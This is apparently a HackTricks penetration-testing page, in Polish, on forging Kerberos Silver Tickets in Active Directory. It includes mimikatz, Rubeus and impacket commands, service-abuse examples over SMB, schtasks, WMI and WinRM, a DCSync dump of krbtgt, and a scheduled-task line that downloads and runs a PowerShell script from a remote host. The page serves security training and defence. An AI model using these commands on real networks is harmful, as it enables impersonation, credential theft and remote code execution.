# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Atak **Silver Ticket** polega na wykorzystaniu biletów serwisowych w środowiskach Active Directory (AD). Metoda ta opiera się na **zdobyciu hasha NTLM konta serwisowego**, takiego jak konto komputera, w celu sfałszowania biletu Ticket Granting Service (TGS). Dzięki temu sfałszowanemu biletowi, atakujący może uzyskać dostęp do określonych usług w sieci, **podszywając się pod dowolnego użytkownika**, zazwyczaj dążąc do uzyskania uprawnień administracyjnych. Podkreśla się, że użycie kluczy AES do fałszowania biletów jest bardziej bezpieczne i mniej wykrywalne.

Do tworzenia biletów stosuje się różne narzędzia w zależności od systemu operacyjnego:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Na Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Usługa CIFS jest wyróżniana jako powszechny cel do uzyskania dostępu do systemu plików ofiary, ale inne usługi, takie jak HOST i RPCSS, również mogą być wykorzystywane do zadań i zapytań WMI.

## Dostępne usługi

| Typ usługi                                 | Usługa Silver Tickets                                                      |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                   |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>W zależności od systemu operacyjnego także:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>W niektórych przypadkach możesz po prostu poprosić o: WINRM</p> |
| Zaplanowane zadania                        | HOST                                                                      |
| Udostępnianie plików Windows, także psexec | CIFS                                                                      |
| Operacje LDAP, w tym DCSync               | LDAP                                                                      |
| Narzędzia do zdalnej administracji serwerów Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                        |
| Złote bilety                               | krbtgt                                                                    |

Używając **Rubeus**, możesz **poprosić o wszystkie** te bilety, używając parametru:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Identyfikatory zdarzeń biletów Silver

- 4624: Logowanie konta
- 4634: Wylogowanie konta
- 4672: Logowanie administratora

## Wykorzystywanie biletów usługowych

W poniższych przykładach wyobraźmy sobie, że bilet został odzyskany, podszywając się pod konto administratora.

### CIFS

Dzięki temu biletowi będziesz mógł uzyskać dostęp do folderów `C$` i `ADMIN$` za pośrednictwem **SMB** (jeśli są wystawione) i skopiować pliki do części zdalnego systemu plików, po prostu robiąc coś takiego:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Będziesz również w stanie uzyskać powłokę wewnątrz hosta lub wykonać dowolne polecenia za pomocą **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Dzięki temu uprawnieniu możesz generować zaplanowane zadania na zdalnych komputerach i wykonywać dowolne polecenia:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Dzięki tym biletom możesz **wykonać WMI w systemie ofiary**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Znajdź **więcej informacji o wmiexec** na następującej stronie:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Dzięki dostępowi winrm do komputera możesz **uzyskać do niego dostęp** i nawet uruchomić PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Sprawdź następującą stronę, aby dowiedzieć się **więcej sposobów na połączenie z zdalnym hostem za pomocą winrm**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Zauważ, że **winrm musi być aktywne i nasłuchujące** na zdalnym komputerze, aby uzyskać do niego dostęp.

### LDAP

Dzięki temu uprawnieniu możesz zrzucić bazę danych DC za pomocą **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Dowiedz się więcej o DCSync** na następującej stronie:

## Odniesienia

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}
